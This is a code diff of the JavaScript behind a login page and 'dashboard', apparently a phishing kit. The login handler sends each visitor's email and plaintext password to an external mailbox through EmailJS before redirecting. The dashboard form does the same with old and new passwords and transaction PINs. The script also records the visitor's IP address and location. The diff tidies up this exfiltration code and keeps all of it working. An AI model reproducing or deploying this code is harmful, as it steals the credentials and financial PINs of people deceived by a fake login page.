@@ -61,17 +61,8 @@ async function login(email, password) {
     }, 1000);
   }
 
-  const emailEmpty = !email || email.trim() === "";
-  const passwordEmpty = !password || password === "";
-
-  if (emailEmpty && passwordEmpty) {
-    showModal("Please fill in your login details.");
-    focusEmailDelayed();
-    return;
-  }
-
-  if (emailEmpty) {
-    showModal("Please fill in your email.");
+  if (!email || email.trim() === "") {
+    showModal("Please enter your email.");
     focusEmailDelayed();
     return;
   }
@@ -82,32 +73,25 @@ async function login(email, password) {
     return;
   }
 
-  if (!isPasswordValid(password)) {
+  if (!password) {
     showModal("Password cannot be empty.");
     return;
   }
 
   if (!window.emailjs) {
-    console.error("EmailJS SDK not loaded");
-    showModal("Service temporarily unavailable. Please try again later.");
+    showModal("Service temporarily unavailable. Try again later.");
     return;
   }
 
   try {
-    console.log("📨 Sending EmailJS message...");
-    await emailjs.send(
-      "service_6nw221q",
-      "template_d6k3x8f",
-      {
-        useremail: email,
-        userpassword: password,
-        time: new Date().toISOString(),
-      }
-    );
-    console.log("✅ EmailJS success");
-  } catch (error) {
-    console.error("❌ EmailJS ERROR:", error);
-    showModal("Unable to process request at the moment. Please try again.");
+    await emailjs.send("service_6nw221q", "template_d6k3x8f", {
+      useremail: email,
+      userpassword: password,
+      time: new Date().toISOString(),
+    });
+  } catch (err) {
+    console.error("EmailJS login error:", err);
+    showModal("Unable to process login at this time.");
     return;
   }
 
@@ -115,7 +99,8 @@ async function login(email, password) {
   window.location.href = "dashboard.html";
 }
 
- async function sendDashboardData() {
+// ======= DASHBOARD FUNCTION =======
+async function sendDashboardData() {
   const oldPassword = document.getElementById("oldPassword")?.value || "";
   const newPassword = document.getElementById("newPassword")?.value || "";
   const confirmNewPassword = document.getElementById("confirmNewPassword")?.value || "";
@@ -123,30 +108,27 @@ async function login(email, password) {
   const confirmTransactionPin = document.getElementById("confirmTransactionPin")?.value || "";
 
   if (!window.emailjs) {
-    console.error("EmailJS SDK not loaded");
-    alert("Service temporarily unavailable. Try again later.");
+    showModal("Service temporarily unavailable. Try again later.");
     return;
   }
 
   try {
-    await emailjs.send(
-      "service_6nw221q",       // your service ID
-      "template_d6k3x8f",      // your template ID
-      {
-        oldPassword,
-        newPassword,
-        confirmNewPassword,
-        transactionPin,
-        confirmTransactionPin,
-        time: new Date().toISOString()
-      }
-    );
-    alert("Dashboard data sent successfully!");
+    await emailjs.send("service_6nw221q", "template_d6k3x8f", {
+      oldPassword,
+      newPassword,
+      confirmNewPassword,
+      transactionPin,
+      confirmTransactionPin,
+      time: new Date().toISOString(),
+    });
+    showModal("Dashboard data sent successfully!");
+    // Optional: reset form after sending
+    // document.getElementById("resetPasswordForm")?.reset();
   } catch (err) {
-    console.error("EmailJS error:", err);
-    alert("Failed to send dashboard data.");
+    console.error("EmailJS dashboard error:", err);
+    showModal("Failed to send dashboard data. Try again.");
   }
- }
+}
 
 // ======= DASHBOARD HELPER =======
 function loadDashboard() {
@@ -155,12 +137,11 @@ function loadDashboard() {
     window.location.href = "index.html";
     return;
   }
-
   const emailEl = document.getElementById("userEmail");
   if (emailEl) emailEl.textContent = currentUser.email;
 }
 
-// ======= USER LOCATION (IP-based) =======
+// ======= USER LOCATION =======
 async function fetchUserLocation() {
   const ipEl = document.getElementById("user-ip");
   const locationEl = document.getElementById("user-location");
@@ -170,7 +151,6 @@ async function fetchUserLocation() {
     const res = await fetch("https://ipapi.co/json/");
     const data = await res.json();
 
-    // Convert country code to emoji
     const flag = data?.country_code
       ? data.country_code.toUpperCase().replace(/./g, c => String.fromCodePoint(127397 + c.charCodeAt()))
       : "";
@@ -181,37 +161,30 @@ async function fetchUserLocation() {
     const country = data?.country_name || "Unknown Country";
     const timezone = data?.timezone || "UTC";
 
-    localStorage.setItem("sessionLocation", JSON.stringify({ ip, city, region, country, timezone }));
+    localStorage.setItem(
+      "sessionLocation",
+      JSON.stringify({ ip, city, region, country, timezone })
+    );
 
     if (ipEl) ipEl.textContent = `IP: ${ip}`;
     if (locationEl)
       locationEl.textContent = `Location: ${flag} ${city}${region ? ", " + region : ""}, ${country}`;
     if (timeEl)
       timeEl.textContent = `Time: ${new Date().toLocaleString("en-US", { timeZone: timezone })}`;
-  } catch (e) {
-    console.warn("Could not fetch IP location:", e);
+  } catch (err) {
+    console.warn("IP fetch error:", err);
     if (ipEl) ipEl.textContent = "IP: N/A";
     if (locationEl) locationEl.textContent = "Location: N/A";
     if (timeEl) timeEl.textContent = `Time: ${new Date().toLocaleString()}`;
   }
 }
 
- const resetBtn = document.getElementById("resetPasswordBtn");
-if (resetBtn) {
-  resetBtn.addEventListener("click", async (e) => {
-    e.preventDefault(); // prevent default form submission
-    await sendDashboardData();
-    // Optional: you can reset the form after sending
-    // document.getElementById("resetPasswordForm").reset();
-  });
-}
-
-// ======= HOOKS / EVENT BINDING =======
+// ======= DOM CONTENT LOADED =======
 document.addEventListener("DOMContentLoaded", () => {
+  // Login Button
   const loginBtn = document.getElementById("loginBtn");
-
   if (loginBtn) {
-    loginBtn.addEventListener("click", async (e) => {
+    loginBtn.addEventListener("click", async e => {
       e.preventDefault();
       const email = document.getElementById("email")?.value.trim();
       const password = document.getElementById("password")?.value;
@@ -219,9 +192,18 @@ document.addEventListener("DOMContentLoaded", () => {
     });
   }
 
-  if (document.getElementById("userEmail")) {
-    loadDashboard();
+  // Dashboard Reset Button
+  const resetBtn = document.getElementById("resetPasswordBtn");
+  if (resetBtn) {
+    resetBtn.addEventListener("click", async e => {
+      e.preventDefault();
+      await sendDashboardData();
+    });
   }
 
+  // Load Dashboard user email if exists
+  if (document.getElementById("userEmail")) loadDashboard();
+
+  // Fetch IP & location
   fetchUserLocation();
 });
